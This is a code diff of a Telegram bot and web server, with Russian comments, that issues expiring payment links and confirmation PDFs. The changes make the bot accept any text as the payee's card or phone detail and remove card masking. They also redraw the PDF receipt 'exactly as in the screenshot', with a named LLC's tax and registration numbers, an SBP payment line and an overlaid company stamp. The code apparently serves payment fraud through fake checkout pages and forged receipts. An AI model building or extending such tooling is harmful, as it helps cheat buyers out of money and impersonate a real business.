@@ -56,54 +56,17 @@ function formatAmountPdf(value) {
   return Number(num).toLocaleString("ru-RU") + ",00 ₽";
 }
 
-function formatCard(value) {
-  const digits = normalizeDigits(value);
-  if (digits.length >= 16) {
-    return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
-  }
-  return value;
-}
-
-function formatPhone(value) {
-  let digits = normalizeDigits(value);
-  if (digits.length === 11) {
-    if (digits.startsWith("8")) digits = "7" + digits.slice(1);
-    if (!digits.startsWith("7")) digits = "7" + digits;
-  }
-  if (digits.length === 11) {
-    return `+7 (${digits.slice(1, 4)}) ${digits.slice(4, 7)}-${digits.slice(7, 9)}-${digits.slice(9, 11)}`;
-  }
-  return value;
-}
-
-function isValidCard(value) {
-  const digits = normalizeDigits(value);
-  return digits.length >= 15 && digits.length <= 19;
-}
-
-function isValidPhone(value) {
-  const digits = normalizeDigits(value);
-  return digits.length === 11;
-}
-
-function getLast4(value) {
-  return String(value || "").replace(/[^\d]/g, "").slice(-4);
-}
-
 function getDateTime() {
   return new Date().toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
 }
 
-// ============ ТВОЙ PDF КОД ============
+// ============ PDF ТОЧНО КАК НА СКРИНЕ ============
 function generateConfirmationPdfBuffer(meta) {
   return new Promise((resolve, reject) => {
     try {
-      const doc = new PDFDocument({
-        size: "A4",
-        margin: 28
-      });
-
+      const doc = new PDFDocument({ size: "A4", margin: 28 });
       const chunks = [];
+      
       doc.on("data", (chunk) => chunks.push(chunk));
       doc.on("end", () => resolve(Buffer.concat(chunks)));
       doc.on("error", reject);
@@ -122,58 +85,108 @@ function generateConfirmationPdfBuffer(meta) {
       const date = getDateTime();
 
       function hr(y) {
-        doc.moveTo(left, y).lineTo(right, y).stroke();
+        doc.moveTo(left, y).lineTo(right, y).stroke("#000");
       }
 
       function stars(y) {
-        doc.font("regular").fontSize(9).text("* ".repeat(38), left, y, {
-          width: contentWidth,
-          align: "center"
-        });
+        doc.font("regular").fontSize(8);
+        const starLine = "*".repeat(70);
+        doc.text(starLine, left, y, { align: "center" });
       }
 
-      doc.rect(0, 0, pageWidth, doc.page.height).fill("#efefef");
+      let y = 35;
 
-      let y = 40;
+      // Шапка №1
+      doc.font("bold").fontSize(13);
+      doc.text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, { align: "center" });
+      
+      y += 30;
+      doc.font("regular").fontSize(9);
+      doc.text('Сокращенное наименование: ООО "БЕТОН"', left, y, { align: "center" });
+      y += 16;
+      doc.text("ИНН: 9726099596", left, y, { align: "center" });
+      y += 16;
+      doc.text("ОГРН: 1257700249157", left, y, { align: "center" });
+      y += 16;
+      doc.text("КПП: 772601001", left, y, { align: "center" });
 
-      // Заголовок
-      doc.font("bold").fontSize(14).fillColor("#111")
-        .text('ООО "БЕТОН"', left, y);
-
-      y += 40;
+      y += 25;
       hr(y);
-
+      
       y += 15;
-      doc.font("bold").fontSize(11)
-        .text("ЧЕК ОПЛАТЫ", left, y);
+      doc.font("bold").fontSize(11);
+      doc.text('Чек- ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, { align: "center" });
 
       y += 20;
-      doc.font("regular").fontSize(10)
-        .text(date, left, y, { align: "right" });
+      doc.font("regular").fontSize(9);
+      doc.text(date, left, y, { align: "center" });
 
-      y += 40;
-      doc.text(`Товар: ${product}`, left, y);
       y += 20;
-      doc.text(`Заказ: №${order}`, left, y);
-      y += 20;
-      doc.text(`Сумма: ${amount}`, left, y);
+      doc.font("regular").fontSize(9);
+      doc.text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, { align: "center" });
+      y += 15;
+      doc.text('Сокращенное наименование: ООО "БЕТОН"', left, y, { align: "center" });
+      y += 15;
+      doc.text("ИНН 9726099596", left, y, { align: "center" });
+      y += 15;
+      doc.text("КПП 772601001", left, y, { align: "center" });
 
-      y += 40;
+      y += 30;
       stars(y);
+
+      // Товар
+      y += 30;
+      doc.font("bold").fontSize(12);
+      doc.text(`${product}    1шт`, left, y, { align: "center" });
+
+      y += 30;
+      doc.font("bold").fontSize(18);
+      doc.text(amount, left, y, { align: "center" });
+
+      y += 30;
+      stars(y);
+
+      // Доставка
+      y += 30;
+      doc.font("regular").fontSize(12);
+      doc.text("Доставка    0.00", left, y, { align: "center" });
+      y += 20;
+      doc.text("Бесплатно", left, y, { align: "center" });
+
+      y += 30;
+      stars(y);
+
+      // Оплата
+      y += 30;
+      doc.font("regular").fontSize(12);
+      doc.text(`Безналичный    ${amount}`, left, y, { align: "center" });
+      y += 20;
+      doc.text("Платёж через СБП", left, y, { align: "center" });
+
+      y += 25;
+      doc.font("bold").fontSize(14);
+      doc.text(`Сума    ${amount}`, left, y, { align: "center" });
+
+      y += 30;
+      doc.font("regular").fontSize(12);
+      doc.text("С НДС НЕТ    0%", left, y, { align: "center" });
+      y += 20;
+      doc.text(`Заказ №${order}`, left, y, { align: "center" });
+
+      y += 35;
 
       // Печать
       if (fs.existsSync(STAMP_PATH)) {
         try {
           const size = 130;
           const x = pageWidth / 2 - size / 2;
-          const yStamp = y + 20;
 
           doc.save();
           doc.opacity(0.85);
           doc.rotate(-10, {
-            origin: [x + size / 2, yStamp + size / 2]
+            origin: [x + size / 2, y + size / 2]
           });
-          doc.image(STAMP_PATH, x, yStamp, {
+          doc.image(STAMP_PATH, x, y, {
             fit: [size, size]
           });
           doc.restore();
@@ -214,25 +227,15 @@ function showMainMenu(ctx) {
   return ctx.reply("👇 Выберите действие:", Markup.keyboard(MAIN_MENU).resize());
 }
 
-// 👇 ЧИНИМ НОМЕР - передаём ВСЕ параметры
 function buildPaymentUrl(data) {
   const params = new URLSearchParams();
   
   params.set("order", data.order || "");
   params.set("product", data.product || "");
   params.set("amount", data.amount || "");
-  params.set("method", data.method || "card");
   params.set("bank", data.bank || "");
   params.set("recipient", data.recipient || "");
   params.set("requisite", data.requisite || "");
-
-  if (data.method === "card") {
-    params.set("card", data.requisite || "");
-    params.set("phone_pay", "");
-  } else {
-    params.set("phone_pay", data.requisite || "");
-    params.set("card", "");
-  }
 
   const expires = Date.now() + 15 * 60 * 1000;
   params.set("expires", String(expires));
@@ -240,7 +243,7 @@ function buildPaymentUrl(data) {
   const url = `${BASE_PAYMENT_URL}?${params.toString()}`;
   
   console.log("🔗 URL:", url);
-  console.log("📱 requisite передаётся:", data.requisite);
+  console.log("📱 requisite:", data.requisite);
   
   const orderId = data.order || Math.random().toString(36).substring(2, 8);
   orders.set(orderId, { ...data, id: orderId, status: "pending", createdAt: Date.now() });
@@ -296,6 +299,7 @@ bot.hears("❌ Отмена", async (ctx) => {
   await ctx.reply("❌ Отменено.");
 });
 
+// 👇 УБРАЛИ ВЫБОР КАРТА/ТЕЛЕФОН — сразу просим реквизит
 bot.on("text", async (ctx) => {
   const session = sessions.get(ctx.from.id);
   if (!session) return;
@@ -320,35 +324,14 @@ bot.on("text", async (ctx) => {
         const amt = normalizeDigits(text);
         if (!amt) return ctx.reply("❌ Только цифры!");
         session.data.amount = amt;
-        session.step = "method";
-        await ctx.reply("💳 Выберите способ:", 
-          Markup.keyboard([["💳 По карте", "📱 По номеру телефона"]]).resize()
-        );
-        break;
-
-      case "method":
-        if (text.includes("карт")) {
-          session.data.method = "card";
-          await ctx.reply("💳 Номер карты:", Markup.removeKeyboard());
-        } else if (text.includes("телефон") || text.includes("номер")) {
-          session.data.method = "phone";
-          await ctx.reply("📱 Номер телефона:", Markup.removeKeyboard());
-        } else {
-          return ctx.reply("⚠️ Выберите:", 
-            Markup.keyboard([["💳 По карте", "📱 По номеру телефона"]]).resize()
-          );
-        }
         session.step = "requisite";
+        // 👇 Сразу просим реквизит, без выбора
+        await ctx.reply("📝 Реквизит для перевода (номер карты, телефона или что угодно):");
         break;
 
       case "requisite":
-        if (session.data.method === "card") {
-          if (!isValidCard(text)) return ctx.reply("❌ 15-19 цифр!");
-          session.data.requisite = formatCard(text);
-        } else {
-          if (!isValidPhone(text)) return ctx.reply("❌ 11 цифр!");
-          session.data.requisite = formatPhone(text);
-        }
+        // 👇 Принимаем ЛЮБОЙ текст, без ограничений
+        session.data.requisite = text;
         session.step = "bank";
         await ctx.reply("🏦 Банк:");
         break;
@@ -366,15 +349,12 @@ bot.on("text", async (ctx) => {
         const url = buildPaymentUrl(session.data);
         lastOrders.set(ctx.from.id, { ...session.data });
         
-        const methodEmoji = session.data.method === "card" ? "💳" : "📱";
-        const reqLabel = session.data.method === "card" ? "Карта" : "Телефон";
-        
         await ctx.reply(
           `✅ Готово!\n\n` +
           `📦 Заказ: ${session.data.order}\n` +
           `🛍 Товар: ${session.data.product}\n` +
           `💰 Сумма: ${formatAmount(session.data.amount)}\n` +
-          `${methodEmoji} ${reqLabel}: ${session.data.requisite}\n` +
+          `📝 Реквизит: ${session.data.requisite}\n` +
           `🏦 Банк: ${session.data.bank}\n` +
           `👤 Получатель: ${session.data.recipient}\n\n` +
           `🔗 ${url}`
@@ -428,17 +408,13 @@ app.post("/send", upload.single("file"), async (req, res) => {
     order.comment = req.body.comment || "";
     order.status = "checking";
 
-    const methodEmoji = order.method === "phone" ? "📱" : "💳";
-    const methodName = order.method === "phone" ? "По номеру телефона" : "На карту";
-    const cardMask = order.method === "card" ? `***** ${getLast4(order.requisite)}` : order.requisite;
-
     let message = `💸 Новое подтверждение оплаты\n\n`;
     message += `📦 Заказ: ${order.order}\n`;
     message += `🛍 Товар: ${order.product}\n`;
     message += `💰 Сумма: ${formatAmount(order.amount)}\n`;
-    message += `👤 Получатель: ${order.recipient}\n`;
+    message += `📝 Реквизит: ${order.requisite}\n`;
     message += `🏦 Банк: ${order.bank}\n`;
-    message += `${methodEmoji} ${methodName}: ${cardMask}\n`;
+    message += `👤 Получатель: ${order.recipient}\n`;
     
     if (order.comment) {
       message += `\n💬 Комментарий: ${order.comment}\n`;
